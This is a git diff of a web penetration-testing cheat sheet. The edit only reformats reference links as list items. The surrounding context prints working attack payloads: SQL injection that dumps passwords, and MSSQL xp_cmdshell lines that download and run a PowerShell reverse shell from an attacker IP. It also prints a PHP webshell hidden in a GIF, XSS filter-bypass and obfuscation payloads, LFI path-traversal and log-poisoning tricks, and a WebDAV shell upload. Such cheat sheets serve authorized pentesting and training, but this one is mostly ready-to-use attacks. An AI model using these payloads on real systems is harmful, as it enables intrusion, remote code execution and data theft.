@@ -93,7 +93,7 @@ http://site.com/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM
 ```
 
 -> Reference  
-https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf
+- https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf
 
 ## MSSQL Injection
 -> Bypass Authentication
@@ -114,7 +114,7 @@ https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-ap
 ```
 ' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<ip>/InvokePowerShellTcp.ps1')" ;--
 ```
-https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+- https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 
 ## Abuse MSSQL
 -> edit Invoke-PowerShellTcp.ps1, adding this:  
@@ -127,7 +127,7 @@ impacket-mssqlclient <user>@<ip> -db <database>
 ```
 xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://<IP>/Invoke-PowerShellTcp.ps1\")
 ```
-https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+- https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 
 ## Cross-Site Scripting
 1-> Identify the language and frameworks used  
@@ -154,14 +154,14 @@ https://portswigger.net/daily-swig/xss-protection-disappears-from-microsoft-edge
 https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/X-XSS-Protection  
 
 ### XSS Keylogger
-https://rapid7.com/blog/post/2012/02/21/metasploit-javascript-keylogger/
-https://github.com/hadynz/xss-keylogger
+- https://rapid7.com/blog/post/2012/02/21/metasploit-javascript-keylogger/
+- https://github.com/hadynz/xss-keylogger
 
 ### XSS Mutation
-http://www.businessinfo.co.uk/labs/mxss/
+- http://www.businessinfo.co.uk/labs/mxss/
 
 ### XSS Poliglote
-https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
+- https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 
 ### Regex Blacklist Filtering
 -> Filter blocking on - Bypass  
@@ -222,9 +222,9 @@ Add execution sink:
 ```
 <img src=x onerror="setTimeout('\x61\154\145\x72\164\x28\x31\x29')"/>
 ```
-https://checkserp.com/encode/unicode/  
-http://www.unit-conversion.info/texttools/octal/  
-http://www.unit-conversion.info/texttools/hexadecimal/  
+- https://checkserp.com/encode/unicode/  
+- http://www.unit-conversion.info/texttools/octal/  
+- http://www.unit-conversion.info/texttools/hexadecimal/  
 
 ### Other Examples
 #### HTML Tag
@@ -280,13 +280,13 @@ javascript:alert(1)
 
 ### JavaScript Encoding
 -> jjencode  
-https://utf-8.jp/public/jjencode.html   
+- https://utf-8.jp/public/jjencode.html   
 -> aaencode  
-https://utf-8.jp/public/aaencode.html  
+- https://utf-8.jp/public/aaencode.html  
 -> jsfuck  
-http://www.jsfuck.com/  
+- http://www.jsfuck.com/  
 -> Xchars.js  
-https://syllab.fr/projets/experiments/xcharsjs/5chars.pipeline.html  
+- https://syllab.fr/projets/experiments/xcharsjs/5chars.pipeline.html  
 
 ### Decoder - Obfuscation (Javascript Decoder and PHP)
 https://malwaredecoder.com/  
@@ -308,16 +308,16 @@ https://malwaredecoder.com/
 ```
 
 ### Template - Nuclei
-https://raw.githubusercontent.com/esetal/nuclei-bb-templates/master/xss-fuzz.yaml
+- https://raw.githubusercontent.com/esetal/nuclei-bb-templates/master/xss-fuzz.yaml
 
 ## Git Exposed
 ```bash
 git-dumper http://site.com/.git .
 ```
-https://github.com/arthaud/git-dumper
+- https://github.com/arthaud/git-dumper
 
 ### Tools
-https://github.com/internetwache/GitTools
+- https://github.com/internetwache/GitTools
 
 ## Broken Access Control - IDOR (Insecure Direct Object References)
 1. Search listing of Id's in requests and in case you don't find create at least two accounts and analysis requests involving ID's  
@@ -355,8 +355,8 @@ GET /admin/profile #Unauthorized
 GET /ADMIN/profile #Authorized
 
 ### UUIDv1
-https://caon.io/docs/exploitation/other/uuid/
-https://github.com/felipecaon/uuidv1gen
+- https://caon.io/docs/exploitation/other/uuid/
+- https://github.com/felipecaon/uuidv1gen
 
 #### Others
 -> add .json if in ruby
@@ -369,10 +369,10 @@ https://github.com/felipecaon/uuidv1gen
 ```
 git-dumper http://site.com/.git .
 ```
-https://github.com/arthaud/git-dumper
+- https://github.com/arthaud/git-dumper
 
 ### Tools
-https://github.com/internetwache/GitTools
+- https://github.com/internetwache/GitTools
 
 ## Local File Inclusion - LFI
 ### Replace ../ - Bypass
@@ -423,7 +423,7 @@ https://site.com/index.php?file=index.p.phphp
 ```bash
 echo 'GIF8<?php system($_GET["cmd"]); ?>' > ok.gif
 ``` 
-https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/codes/webshells/shell.gif  
+- https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/codes/webshells/shell.gif  
 -> Zip  
 1-  
 ```bash
@@ -478,24 +478,24 @@ http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id
 ```
 
 ### Template LFI and directory traversal - Nuclei
-https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/fuzzing/linux-lfi-fuzzing.yaml
-https://raw.githubusercontent.com/CharanRayudu/Custom-Nuclei-Templates/main/dir-traversal.yaml
+- https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/fuzzing/linux-lfi-fuzzing.yaml
+- https://raw.githubusercontent.com/CharanRayudu/Custom-Nuclei-Templates/main/dir-traversal.yaml
 
 ### Wordlists
 -> burp-parameter-names.txt - Wordlist for parameter fuzzing  
-https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt  
+- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt  
 	
 -> Wordlist LFI - Linux  
-https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt  
+- https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt  
 	
 -> Wordlist LFI - Windows  
-https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt 
+- https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt 
 	
 -> bypass_lfi.txt  
-https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/wordlists/lfi_bypass.txt  
+- https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/wordlists/lfi_bypass.txt  
 	
 -> poisoning.txt  
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/posoning.txt  
+- https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/posoning.txt  
 
 ## Remote File Inclusion (RFI)
 ### RFI to Webshell with null byte for image extension bypass
@@ -564,4 +564,4 @@ put <shell.asp>
 ```bash
 curl -u "<user>:<password>" http://<IP>/webdav/shell.asp
 ```
-https://github.com/notroj/cadaver
+- https://github.com/notroj/cadaver
